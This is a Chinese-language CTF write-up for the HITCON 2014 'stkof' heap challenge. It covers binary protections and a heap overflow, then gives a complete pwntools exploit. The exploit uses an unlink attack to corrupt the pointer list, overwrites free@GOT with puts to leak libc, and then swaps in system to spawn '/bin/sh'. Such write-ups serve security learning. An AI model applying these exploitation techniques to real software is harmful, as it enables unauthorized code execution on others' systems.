---
title: 2014 HITCON stkof (Unlink)
date: 2018-03-28 21:23:18
categories: 
tags:
	- CTF
	- unlink

---



## 查看信息

```shell
$ checksec stkof 
[*] '/home/pwn/\xe6\xa1\x8c\xe9\x9d\xa2/stkof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

可以看出，程序是 64 位的，主要开启了 Canary 和 NX 保护。



## 程序分析

1. 分配指定大小的内存，并在bss段记录对应 chunk 的指针，假设其为global。这里需要注意 ， buf[1] 为第一个。



![img-1](HITCON2014-stkof/img-1.jpg)



1. 根据指定索引，以及指定大小向指定内存处，读入数据。可见，这里存在堆溢出的情况，因为这里读入字节的大小是由我们来控制的。
2. 根据指定索引，释放已经分配的内存块。
3. 没有什么作用。

**值得注意的是，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为1024 和 1024。**

**初次调用 fgets 时，malloc会分配缓冲区 1024 大小。**



## 思路

使用pwntools，利用unlink漏洞，改写free为puts，实现任意地址泄露。然后使用DynELF找到system，再将free替换为system，执行system(‘/bin/sh’)。



```python
from pwn import *
#context.log_level = 'debug'
sock = process('./stkof')

def add(len):
    sock.sendline('1')
    sock.sendline(str(len))
    sock.recvn(5)

def edit(index, content):
    sock.sendline('2')
    sock.sendline(str(index))
    sock.sendline(str(len(content)))
    sock.send(content)
    sock.recvn(3)

def delete(index):
    sock.sendline('3')
    sock.sendline(str(index))

#leak at least 1 byte then everything is OK
def peek(addr):
    edit(2, 'A'*16 + p64(addr))
    delete(1) # push(addr)
    str = sock.recvuntil('OK\n')
    result = str.split('\x0aOK')[0]
    if result == '':
        return '\x00'
    return result

#chunk list
bag = 0x602140  

add(0x48) #1
add(0x48) #2
add(0x100-8) #3
add(0x100-8) #4
add(0x100-8) #5

# 反汇编代码中表示 i++ ， 先相加在赋值 ，请看代码下面
# x 指向buf[2]
x = bag + 2*8
fd = x - 0x18
bk = x - 0x10

edit(2, p64(0) + p64(0) + p64(fd) + p64(bk) + 'C'*32 + p64(0x40) + '\x00')

#free后 buf[2] 可以写入 &buf[2]-3，请看代码下面
delete(3)
sock.recvn(3)

puts_plt = 0x400760
free_got = 0x602018
atoi_got = 0x602088
alarm_got = 0x602048
puts_got = 0x602020

#replace free by puts
edit(2, 'A'*16 + p64(free_got))
edit(1, p64(puts_plt)) 
# 为什么是puts_plt 而不是puts_got， 
# 根据延迟绑定技术， 我猜想是：
# 函数执行后 ，puts_plt 才是真正的函数执行代码的地址
# puts 没有执行过， 所以用 puts_plt


d = DynELF(peek, elf=ELF('./stkof'))
system_addr = int(d.lookup('system', 'libc'))

#write /bin/sh
edit(4, '/bin/sh\0')

#replace free by system
edit(2, 'A'*16 + p64(free_got))
edit(1, p64(system_addr))

#call system(/bin/sh)
delete(4) #system(/bin/sh)

sock.interactive()
```

第一次 free() 控制读写

0x602140 为 buf[0] 的位置，但是chunk list 开始保存的位置在0x602148 即 buf[1]。

0x602150 即 buf[2] 可以写入 0x0000000000602138 ， 覆盖 chunk lish 。

```
0x602140:	0x0000000000000000	0x00000000026b0020
0x602150:	0x0000000000602138	0x00000000026b04d0
0x602160:	0x00000000026b05d0	0x00000000026b06d0
0x602170:	0x0000000000000000	0x0000000000000000
0x602180:	0x0000000000000000	0x0000000000000000
```



## 参考：

https://blog.csdn.net/fuchuangbob/article/details/51649353

https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/#_3

http://yunnigu.dropsec.xyz/2017/02/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/